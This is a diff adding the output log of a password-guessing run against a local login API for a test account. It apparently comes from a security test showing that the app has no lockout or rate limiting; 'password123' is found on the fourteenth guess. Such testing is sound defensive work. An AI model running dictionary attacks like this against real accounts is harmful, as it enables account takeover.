@@ -1,0 +1,21 @@
+[*] Target : http://127.0.0.1:5000/api/login
+[*] Email  : ben@fitnesshub.test
+[*] Guesses: 20 from wordlists/common-passwords.txt
+------------------------------------------------------------
+[   1/20] 123456               HTTP 401  incorrect password
+[   2/20] password             HTTP 401  incorrect password
+[   3/20] 12345678             HTTP 401  incorrect password
+[   4/20] qwerty               HTTP 401  incorrect password
+[   5/20] 123456789            HTTP 401  incorrect password
+[   6/20] letmein              HTTP 401  incorrect password
+[   7/20] football             HTTP 401  incorrect password
+[   8/20] iloveyou             HTTP 401  incorrect password
+[   9/20] admin                HTTP 401  incorrect password
+[  10/20] welcome              HTTP 401  incorrect password
+[  11/20] monkey               HTTP 401  incorrect password
+[  12/20] abc123               HTTP 401  incorrect password
+[  13/20] password1            HTTP 401  incorrect password
+[  14/20] password123          HTTP 200  login successful  <== MATCH
+------------------------------------------------------------
+[+] Password found: 'password123' in 14 attempts, 0.03s
+[+] No lockout or rate limiting was triggered -> VULNERABLE.
